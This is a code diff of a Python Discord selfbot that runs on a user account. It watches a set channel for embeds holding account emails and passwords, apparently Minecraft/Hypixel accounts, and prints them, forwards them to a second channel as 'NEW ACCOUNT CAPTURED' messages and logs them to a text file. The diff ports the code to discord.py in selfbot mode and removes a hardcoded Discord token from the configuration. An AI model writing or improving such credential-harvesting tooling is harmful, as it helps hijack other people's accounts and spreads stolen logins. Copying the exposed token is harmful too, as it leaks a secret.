@@ -3,14 +3,15 @@ import re
 import asyncio
 from typing import Dict, Optional
 import datetime
-from discord_self import DiscordSelf, Message, Embed
 from dotenv import load_dotenv
+import discord
+from discord.ext import commands
 
 # Load environment variables
 load_dotenv()
 
 # Configuration
-TOKEN = os.getenv('DTOKEN', 'MTQ4MzA3OTQyNTkxMzUyNDQyNw.gAkc8jW6AxLXP3D3pk_cigyXXbk')
+TOKEN = os.getenv('DISCORD_TOKEN')
 MONITOR_CHANNEL_ID = int(os.getenv('MONITOR_CHANNEL_ID', '1470409209123176642'))
 FORWARD_CHANNEL_ID = int(os.getenv('FORWARD_CHANNEL_ID', '1483459286569849066'))
 
@@ -18,7 +19,7 @@ class AccountParser:
     """Parse account embeds"""
     
     @staticmethod
-    def parse_hypixel_embed(embed: Embed) -> Dict:
+    def parse_hypixel_embed(embed: discord.Embed) -> Dict:
         """Parse Hypixel/FlareCloud account embeds"""
         result = {
             'type': 'hypixel_account',
@@ -61,7 +62,7 @@ class AccountParser:
         return result
     
     @staticmethod
-    def parse_generic_embed(embed: Embed) -> Dict:
+    def parse_generic_embed(embed: discord.Embed) -> Dict:
         """Parse any embed with email/password"""
         result = {
             'type': 'generic_account',
@@ -86,59 +87,69 @@ class AccountParser:
         
         return result
 
-class SelfBot:
+class SelfBot(commands.Bot):
     def __init__(self):
-        self.client = DiscordSelf(token=TOKEN)
+        intents = discord.Intents.default()
+        intents.message_content = True
+        intents.messages = True
+        
+        super().__init__(
+            command_prefix='!',
+            self_bot=True,  # This enables selfbot mode
+            intents=intents,
+            help_command=None
+        )
         self.parser = AccountParser()
         self.captured_accounts = []
-        
-        # Setup event handlers
-        @self.client.event
-        async def on_ready():
-            await self.on_ready()
-        
-        @self.client.event
-        async def on_message(message: Message):
-            await self.on_message(message)
+        self.monitor_channel_id = MONITOR_CHANNEL_ID
+        self.forward_channel_id = FORWARD_CHANNEL_ID
     
     async def on_ready(self):
         print(f'\n{"="*60}')
-        print(f'✓ SELFBOT ONLINE: {self.client.user.name}')
-        print(f'✓ User ID: {self.client.user.id}')
-        print(f'✓ Monitoring Channel: {MONITOR_CHANNEL_ID}')
-        print(f'✓ Forwarding to: {FORWARD_CHANNEL_ID}')
+        print(f'✓ SELFBOT ONLINE: {self.user.name}')
+        print(f'✓ User ID: {self.user.id}')
+        print(f'✓ Monitoring Channel: {self.monitor_channel_id}')
+        print(f'✓ Forwarding to: {self.forward_channel_id}')
         print(f'{"="*60}\n')
         
         # Test connection to channels
         try:
-            monitor_channel = await self.client.fetch_channel(MONITOR_CHANNEL_ID)
-            print(f'✓ Connected to monitoring channel: #{monitor_channel.name}')
-        except:
-            print(f'❌ Cannot access monitoring channel {MONITOR_CHANNEL_ID}')
+            monitor_channel = self.get_channel(self.monitor_channel_id)
+            if monitor_channel:
+                print(f'✓ Connected to monitoring channel: #{monitor_channel.name}')
+            else:
+                print(f'⚠️ Monitoring channel not found, but will still monitor by ID')
+        except Exception as e:
+            print(f'⚠️ Could not verify monitoring channel: {e}')
         
         try:
-            forward_channel = await self.client.fetch_channel(FORWARD_CHANNEL_ID)
-            print(f'✓ Connected to forwarding channel: #{forward_channel.name}')
-        except:
-            print(f'❌ Cannot access forwarding channel {FORWARD_CHANNEL_ID}')
+            forward_channel = self.get_channel(self.forward_channel_id)
+            if forward_channel:
+                print(f'✓ Connected to forwarding channel: #{forward_channel.name}')
+            else:
+                print(f'⚠️ Forwarding channel not found, but will still forward by ID')
+        except Exception as e:
+            print(f'⚠️ Could not verify forwarding channel: {e}')
         
         print(f'\n🚀 Selfbot is running! Waiting for accounts...\n')
     
-    async def on_message(self, message: Message):
+    async def on_message(self, message: discord.Message):
         # Skip own messages
-        if message.author.id == self.client.user.id:
+        if message.author.id == self.user.id:
             return
         
         # Only monitor specific channel
-        if message.channel.id != MONITOR_CHANNEL_ID:
+        if message.channel.id != self.monitor_channel_id:
             return
         
         # Check for embeds
         if message.embeds:
             for embed in message.embeds:
                 await self.process_embed(message, embed)
+        
+        await self.process_commands(message)
     
-    async def process_embed(self, message: Message, embed: Embed):
+    async def process_embed(self, message: discord.Message, embed: discord.Embed):
         """Process embed and forward if account found"""
         
         account_data = None
@@ -155,7 +166,7 @@ class SelfBot:
         if account_data and account_data.get('email') and account_data.get('password'):
             await self.capture_account(message, embed, account_data)
     
-    async def capture_account(self, message: Message, embed: Embed, account_data: Dict):
+    async def capture_account(self, message: discord.Message, embed: discord.Embed, account_data: Dict):
         """Capture and forward account instantly"""
         
         # Store account
@@ -171,15 +182,19 @@ class SelfBot:
         print(f'🎯 ACCOUNT CAPTURED!')
         print(f'{"🔐"*35}')
         print(f'⏰ Time: {datetime.datetime.now().strftime("%H:%M:%S")}')
-        print(f'📌 Source: #{message.channel.name}')
+        print(f'📌 Channel: #{message.channel.name}')
         print(f'👤 Author: {message.author.name}')
-        print(f'\n📧 Email: {account_data["email"]}')
+        print(f'📧 Email: {account_data["email"]}')
         print(f'🔑 Password: {account_data["password"]}')
         
         if account_data.get('status'):
             print(f'📊 Status: {account_data["status"]}')
         if account_data.get('playtime'):
             print(f'⏱️ Playtime: {account_data["playtime"]}')
+        if account_data.get('money'):
+            print(f'💰 Money: {account_data["money"]}')
+        if account_data.get('shards'):
+            print(f'💎 Shards: {account_data["shards"]}')
         
         # Forward to target channel
         await self.forward_account(account_data, message)
@@ -187,52 +202,69 @@ class SelfBot:
         # Save to file
         self.save_to_file(account_data, message)
         
-        print(f'\n✅ Forwarded to channel {FORWARD_CHANNEL_ID}')
+        print(f'✅ Forwarded to channel {self.forward_channel_id}')
         print(f'{"🔐"*35}\n')
     
-    async def forward_account(self, account_data: Dict, original_message: Message):
+    async def forward_account(self, account_data: Dict, original_message: discord.Message):
         """Forward account to target channel instantly"""
         
         try:
-            forward_channel = await self.client.fetch_channel(FORWARD_CHANNEL_ID)
+            forward_channel = self.get_channel(self.forward_channel_id)
+            if not forward_channel:
+                print(f"❌ Cannot find forwarding channel ID: {self.forward_channel_id}")
+                return
             
-            # Create forward message
-            forward_text = f"""
-🎯 **NEW ACCOUNT CAPTURED!**
-━━━━━━━━━━━━━━━━━━━━━━
-📧 **Email:** ||{account_data['email']}||
-🔑 **Password:** ||{account_data['password']}||
-
-📌 **Source:** #{original_message.channel.name}
-👤 **Author:** {original_message.author.name}
-⏰ **Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-"""
+            # Create embed for forwarding
+            embed = discord.Embed(
+                title="🎯 NEW ACCOUNT CAPTURED!",
+                color=0xff0000,
+                timestamp=datetime.datetime.now()
+            )
+            
+            embed.add_field(
+                name="📧 Email",
+                value=f"||{account_data['email']}||",
+                inline=False
+            )
+            embed.add_field(
+                name="🔑 Password",
+                value=f"||{account_data['password']}||",
+                inline=False
+            )
+            
+            embed.add_field(
+                name="📌 Source",
+                value=f"Channel: <#{self.monitor_channel_id}>\nAuthor: {original_message.author.name}",
+                inline=False
+            )
             
             if account_data.get('status'):
-                forward_text += f"📊 **Status:** {account_data['status']}\n"
+                embed.add_field(name="📊 Status", value=account_data['status'], inline=True)
             if account_data.get('playtime'):
-                forward_text += f"⏱️ **Playtime:** {account_data['playtime']}\n"
+                embed.add_field(name="⏱️ Playtime", value=account_data['playtime'], inline=True)
             if account_data.get('money'):
-                forward_text += f"💰 **Money:** {account_data['money']}\n"
+                embed.add_field(name="💰 Money", value=account_data['money'], inline=True)
             if account_data.get('shards'):
-                forward_text += f"💎 **Shards:** {account_data['shards']}\n"
+                embed.add_field(name="💎 Shards", value=account_data['shards'], inline=True)
+            if account_data.get('minecraft_type'):
+                embed.add_field(name="🎮 Type", value=account_data['minecraft_type'], inline=True)
             
-            forward_text += "━━━━━━━━━━━━━━━━━━━━━━"
+            embed.set_footer(text=f"Captured at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
             
             # Send to forward channel
-            await forward_channel.send(forward_text)
+            await forward_channel.send(embed=embed)
             
         except Exception as e:
             print(f"❌ Failed to forward: {e}")
     
-    def save_to_file(self, account_data: Dict, message: Message):
+    def save_to_file(self, account_data: Dict, message: discord.Message):
         """Save account to file"""
         filename = f"accounts_{datetime.datetime.now().strftime('%Y%m%d')}.txt"
         
         with open(filename, 'a', encoding='utf-8') as f:
             f.write(f"\n{'='*60}\n")
             f.write(f"Time: {datetime.datetime.now().isoformat()}\n")
-            f.write(f"Source: #{message.channel.name} (ID: {message.channel.id})\n")
+            f.write(f"Channel: #{message.channel.name} (ID: {message.channel.id})\n")
             f.write(f"Author: {message.author.name}\n")
             f.write(f"Email: {account_data['email']}\n")
             f.write(f"Password: {account_data['password']}\n")
@@ -240,14 +272,11 @@ class SelfBot:
                 f.write(f"Status: {account_data['status']}\n")
             if account_data.get('playtime'):
                 f.write(f"Playtime: {account_data['playtime']}\n")
+            if account_data.get('money'):
+                f.write(f"Money: {account_data['money']}\n")
+            if account_data.get('shards'):
+                f.write(f"Shards: {account_data['shards']}\n")
             f.write(f"{'='*60}\n")
-    
-    async def start(self):
-        """Start the selfbot"""
-        try:
-            await self.client.start()
-        except Exception as e:
-            print(f"❌ Failed to start: {e}")
 
 def main():
     if not TOKEN:
@@ -268,10 +297,13 @@ def main():
     print("⚠️  Your account may be banned!")
     print("="*60)
     
-    
-    
+   
+   
     bot = SelfBot()
-    asyncio.run(bot.start())
+    try:
+        bot.run(TOKEN)
+    except Exception as e:
+        print(f"❌ Error: {e}")
     
 
 if __name__ == "__main__":
